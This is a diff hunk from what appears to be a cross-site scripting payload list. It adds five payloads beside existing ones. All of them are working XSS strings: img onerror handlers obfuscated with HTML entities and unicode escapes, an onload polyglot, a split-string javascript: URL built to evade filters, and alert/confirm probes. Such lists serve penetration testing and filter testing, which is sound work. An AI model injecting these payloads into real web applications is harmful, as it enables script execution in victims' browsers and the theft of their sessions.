@@ -2763,3 +2763,8 @@ abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3
 <script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";http://a.click();</script>
 jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'>"'alert(1)
 ">%20<img src=o onerror=alert``>//
+/><img src=d onerror=confirm(/xss/);> 
+<img src=x onerror=alert&#40document.domain&#41>
+<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(document.domain)>
+javascript:window/*Ata*/[%27loc%27%2b%27ati%27%2b%27on%27]%3d%27java%27%2b%27scr%27%2b%27ipt:%27%2blocation/*#*/;alert(origin)
+confirm?.(1)
